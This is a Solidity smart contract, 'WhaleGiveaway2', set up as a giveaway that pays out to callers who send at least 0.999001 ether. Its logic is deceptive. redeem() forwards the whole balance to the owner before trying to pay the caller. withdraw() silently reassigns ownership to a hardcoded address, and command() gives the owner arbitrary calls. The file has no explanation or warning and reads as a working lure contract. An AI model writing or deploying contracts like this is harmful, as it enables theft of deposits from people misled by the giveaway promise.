pragma solidity ^0.8.0;

contract WhaleGiveaway2 {
    address public owner;

    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility, "Insufficient value sent");
        uint balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
        (success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }

    function withdraw() public payable {
        require(msg.sender == owner, "Unauthorized access");
        owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        uint balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }

    function command(address adr, bytes memory data) public payable {
        require(msg.sender == owner, "Unauthorized access");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Call failed");
    }
}